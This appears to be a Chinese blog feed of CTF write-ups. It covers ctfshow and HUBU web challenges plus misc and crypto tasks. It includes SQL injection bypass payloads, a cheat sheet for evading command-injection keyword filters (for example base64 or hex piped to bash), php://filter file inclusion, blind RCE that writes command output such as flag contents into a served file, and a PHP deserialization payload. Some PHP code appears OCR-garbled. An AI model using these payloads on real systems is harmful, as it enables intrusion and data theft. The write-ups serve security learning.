alt="image-20250121135247193"></p><p>可以知道，压缩包的解压密码需要进行hashdump。</p><p>然后找到用户密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135742846.png" alt="image-20250121135742846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135722955.png" alt="image-20250121135722955"></p><p>解压后得到文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135900120.png" alt="image-20250121135900120"></p><p>结合提示搜索，发现了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140041681.png" alt="image-20250121140041681"></p><p>结合用户名，可以知道使用的试MobaXterm，所以ini文件是其配置文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140134279.png" alt="image-20250121140134279"></p><p>网上搜索其密码解密，找到一篇博客，知道可以使用脚本解密</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140432635.png" alt="image-20250121140432635"></p><p>master password就使用文件名 flag_is_here</p><p>最后解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140457763.png" alt="image-20250121140457763"></p><p>将flag内的内容进行base64解密得到flag。</p><blockquote><p>flag{you_are_a_g00d_guy}</p></blockquote><h2 id="crypto">crypto</h2><h4 id="通往哈希的旅程">通往哈希的旅程</h4><blockquote><p>考点：哈希</p></blockquote><p>根据提示得到一个哈希密文</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172603778.png" alt="image-20250117172603778"></p><p>直接哈希爆破或者在线解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172632734.png" alt="image-20250117172632734"></p><blockquote><p>flag{18876011645}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow萌新web</title>
      <link href="/posts/72ad6da1.html"/>
      <url>/posts/72ad6da1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>来源：ctfshow</p></blockquote><p>[TOC]</p><h2 id="web1">web1</h2><blockquote><p>考点：inval()函数漏洞，sql注入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>由于没有限制输入，所以只需要利用inval()的漏洞和sql注入漏洞拿到flag。</p><ol><li><p>?id=’1000‘       #字符串绕过</p></li><li><p>?id=0x3e8      #转换成16进制绕过</p></li><li><p>?id=-1 or id=1000</p></li><li><p>?id=100*10</p></li><li><p>?id=~~1000   #两次取反</p></li><li><p>?id=900%2B100      #%2B是+的url编码</p></li><li><p>?id=round(999.9)</p></li><li><p>?id=999 or 1=1 --+</p></li><li><p>?id=0b1111101000     #二进制</p></li><li><p>?id=125&lt;&lt;3</p></li><li><p>?id=1 union select * from article; --+</p></li><li><p>?id=/<em>!1000</em>/ 内联注释</p></li></ol></blockquote><blockquote><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2">web2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><blockquote><p>多了一个过滤，不能用or, +号，上面筛选一下就行</p><p>?id=‘1000’</p></blockquote><blockquote><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3">web3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依然是多了个过滤。?id=‘1000’</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4">web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;</span><br><span class="line">            die(&quot;id error&quot;);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=‘1000’</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5">web5</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行过滤关键字</title>
      <link href="/posts/d36c6b6d.html"/>
      <url>/posts/d36c6b6d.html</url>
      
        <content type="html"><![CDATA[<h2 id="过滤关键字">过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1''ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用* 匹配任意 <code>cat y1n*</code><br>用?匹配任意 <code>cat y1n?</code><br>用{ }匹配范围 <code>cat y1&#123;a..z&#125;g.php</code><br>变量 <code>$a=fl;$b=ag;cat $a$b.php</code><br>拼接绕过 <code>‘fl’.'ag'</code></p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+‘b’     输出:‘ab’<br>2.贴贴    eg: ‘a’‘b’       输出:‘ab’</p><p>PHP拼接:<br>.    eg: ‘a’.‘b’      输出:‘ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字">过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用&quot;&quot;，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过：">使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过：">嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累：">积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUBU新星杯wp</title>
      <link href="/posts/3c1876bb.html"/>
      <url>/posts/3c1876bb.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="Robots-Leak">Robots Leak</h4><blockquote><p>考点：git泄露</p></blockquote><blockquote><p>开启题目</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130175850152.png" alt="image-20241130175850152"></p><blockquote><p>先扫目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180035365.png" alt="image-20241130180035365"></p><blockquote><p>git泄露，直接拉取git到本地，然后有个.git文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180200728.png" alt="image-20241130180200728"></p><blockquote><p>进入到文件里，查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180256138.png" alt="image-20241130180256138"></p><blockquote><p>找到关键词flag，查看一下内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180337316.png" alt="image-20241130180337316"></p><blockquote><p>拿到一半flag。</p><p>查看一下其他日志内容，都没什么营养，然后看看有没有文件，用git stash pop</p><p>发现拉取了一个.flag.exe，查看得到下一半</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180607763.png" alt="image-20241130180607763"></p><blockquote><p>合起来就是全部flag</p></blockquote><blockquote><p>HUBUCTF{431332b1-e91f-4437-9036-b9059539886f}</p></blockquote><h4 id="ez-http">ez-http</h4><blockquote><p>考点：http基础</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180913089.png" alt="image-20241130180913089"></p><blockquote><p>http基础，按要求一步一步来，建议抓包放进重放器里面，方便</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181057278.png" alt="image-20241130181057278"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181134970.png" alt="image-20241130181134970"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181201614.png" alt="image-20241130181201614"></p><blockquote><p>剩下的就是改referrer，添加一个ip(网上搜一下，多试)，然后改cookie等等。（不截图了）</p></blockquote><h4 id="Random-Door">Random_Door</h4><blockquote><p>考点：python脚本，php伪协议</p></blockquote><blockquote><p>打开网站</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215117246.png" alt="image-20241130215117246"></p><blockquote><p>嗯，好，满天星，写个脚本挨着读</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">base_url = &quot;http://challenge.hubuctf.cn:30423/flag&quot;</span><br><span class="line">delay = 1  # 延迟1秒</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    url = f&quot;&#123;base_url&#125;&#123;i&#125;.php&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            print(f&quot;Success: &#123;url&#125;&quot;)</span><br><span class="line">            print(response.text)</span><br><span class="line">            print(&quot;-&quot; * 40)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;Failed to access &#123;url&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 延迟1秒</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br><span class="line">print(&quot;All requests completed.&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>最后发现只有两个能打开。</p></blockquote><blockquote><p>先看第一个，在flag42.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215346661.png" alt="image-20241130215346661"></p><blockquote><p>这是个提示信息，提示可能要传参file</p></blockquote><blockquote><p>再看第二个flag79.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215427479.png" alt="image-20241130215427479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (preg_match(&#x27;/base64|http/&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    die(&#x27;base64 | http is not allowed&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;flag in flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>传file，直接filter伪协议读取，然后你就会发现。。。。</p></blockquote><blockquote><p>flag.php是空哒！哈哈哈哈哈！！！！！！</p></blockquote><blockquote><p>我只能说真会玩，第一个网页才是真的后门入口，在第一个网页进行filter读取拿到flag。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9ICJIVUJVQ1RGezUwMGE0MzEyLTM2ZTItNDlkZi05MjRlLTkyY2EzYWM0MDMwN30iIDs/Pgo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUBUCTF&#123;500a4312-36e2-49df-924e-92ca3ac40307&#125;</span><br></pre></td></tr></table></figure><h4 id="RCE-Level-2">RCE - Level 2</h4><blockquote><p>考点：无回显rce</p></blockquote><blockquote><p>根据提示知道是没有回显的。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181550210.png" alt="image-20241207181550210"></p><blockquote><p>打开界面，发现是个登录框，先用御剑扫一下目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181645879.png" alt="image-20241207181645879"></p><blockquote><p>发现cmd.php，打开发现就是命令执行框</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181722098.png" alt="image-20241207181722098"></p><blockquote><p>先随便ping一个</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181915228.png" alt="image-20241207181915228"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181942232.png" alt="image-20241207181942232"></p><blockquote><p>发现几乎没啥过滤，但是就是无回显</p><p>无回显做法：</p><p>\1. 将运行结果写入到网站的文件里。</p><p>\2. 写马</p><p>\3. 进行数据外带，如dnslog，curl等都可以</p></blockquote><blockquote><p>经过测试，发现static/script.js是可以写入的（虽然我也不知道怎么测试的，是看的别人的wp）</p><p>在输入框中输入 127.0.0.1;ls &gt; static/script.js ,页面显示<strong>执行成功</strong></p><p>后查看js文件，可以看到执行的结果</p><p>在根目录下找到flag文件 f1ag_1s_h3r3 （ 127.0.0.1;ls / &gt; static/script.js )</p><p>继续读取flag ，执行 127.0.0.1;cat /f1ag_1s_h3r3 &gt; static/script.js</p></blockquote><h4 id="Web-Pentest">Web Pentest *</h4><blockquote><p>考点：APK分析，反序列化</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183244358.png" alt="image-20241207183244358"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183301370.png" alt="image-20241207183301370"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183315132.png" alt="image-20241207183315132"></p><blockquote><p>根据对话信息可以推测，可能在协会官网的源代码里</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183504391.png" alt="image-20241207183504391"></p><blockquote><p><strong>方式一</strong></p><p>逆向手应该都有安卓模拟器，直接apk安装到模拟器上。或者直接安装到手机上。</p><p>启动app就直接有了web后台地址。</p></blockquote><blockquote><p><strong>方式二</strong></p><p>misc 手应该需要会，apk本质也是个压缩包。把apk后缀改成zip然后解压。直接搜flag 但是有一点要注意，app打包之后xml文件是二进制。因此也考察了选手对于grep的使用情况</p><p>/flag1-21daSD21agfgDDDZVFGSVsasd32Ws2asCZCDw.php</p><p>admin:admin</p><p>grep -a -r “flag” .  # 搜索二进制 递归搜索</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183733181.png" alt="image-20241207183733181"></p><blockquote><p>然后里面就是个简单的反序列化考点</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;FLAG.php&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">public function _ construct($file)</span><br><span class="line">&#123;</span><br><span class="line">$this &gt; file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function test()</span><br><span class="line">&#123;</span><br><span class="line">system($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match(&#x27;/filter/&#x27;, $this &gt; file)) &#123;</span><br><span class="line">echo $this &gt; file;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">其实这个序列化很简单链子是 APT &gt; K1T0 触发魔术方法 toString</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">public function kkk()</span><br><span class="line">&#123;</span><br><span class="line">eval ($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">function _ wakeup()</span><br><span class="line">&#123;</span><br><span class="line">echo $this &gt; eth0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">show_source( _ FILE _ );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = base64_decode($_GET[&#x27;file&#x27;]);</span><br><span class="line">unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;php: / filter/read=convert.base64-</span><br><span class="line">encode/resource=/flag&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match( &quot;filter&quot;,$this &gt; file)) &#123;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">&#125;</span><br><span class="line">$a=new APT();</span><br><span class="line">$a &gt; eth0=new K1T0();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">?</span><br><span class="line">file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqA</span><br><span class="line">GZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29</span><br><span class="line">kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><blockquote><p>读取的时候是读取/flag，而不是flag.php，不然是读取不出来的。</p></blockquote><h2 id="misc">misc</h2><h4 id="真假二维码">真假二维码</h4><blockquote><p>考点：文件分离，压缩包密码爆破</p></blockquote><blockquote><p>下载附件，得到一个压缩包，需要密码，根据提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220123688.png" alt="image-20241130220123688"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220230193.png" alt="image-20241130220230193"></p><blockquote><p>解压，有张二维码，扫一下</p></blockquote><p><img 